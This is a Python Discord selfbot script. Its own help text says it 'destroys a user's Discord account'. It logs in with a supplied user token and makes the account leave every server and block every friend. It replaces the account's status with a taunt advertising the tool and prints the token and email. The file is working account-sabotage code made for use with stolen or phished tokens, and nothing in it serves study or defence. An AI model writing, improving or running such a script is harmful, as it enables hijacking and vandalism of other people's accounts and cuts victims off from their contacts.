import discord
from discord.ext import commands 
import os
import argparse
import time
import colorama
from colorama import Fore, Back, init
init()
def clear():
	if os.name != 'nt':
		os.system('clear')
	else:
		os.system('cls')

client = commands.Bot(command_prefix='')

parser = argparse.ArgumentParser(description='Destroys a user\'s Discord account.')
parser.add_argument('-t', action='store', dest="token", help='users token', type=str, required=True)
args = parser.parse_args()

@client.event 
async def on_connect():
	game = discord.Game(
        name='account fucked by github.com/kyliex/accountfucker'
    )
	await client.change_presence(activity=game)
	for guild in client.guilds:
		try:
			await guild.leave()
			print(Fore.LIGHTGREEN_EX + 'Successfully left ' + guild.name + Fore.RESET)
		except:
			print(Fore.LIGHTRED_EX + 'Failed to leave ' + guild.name + Fore.RESET)
			pass
	for friend in client.user.friends:
		try:
			await friend.block()
			print(Fore.LIGHTGREEN_EX + 'Blocked ' + str(friend) + Fore.RESET)
		except Exception as e:
			print(Fore.LIGHTRED_EX + 'Failed to block ' + str(friend) + '. The reason is ' + str(e) + Fore.RESET)
	time.sleep(5)
	clear()
	print(Fore.LIGHTGREEN_EX + 'Discord account successfully destroyed!' + Fore.RESET)
	print('Token: ' + args.token)
	print('Email: ' + client.user.email)

@client.event
async def on_command_error(ctx, error):
	pass

client.run(args.token, bot=False)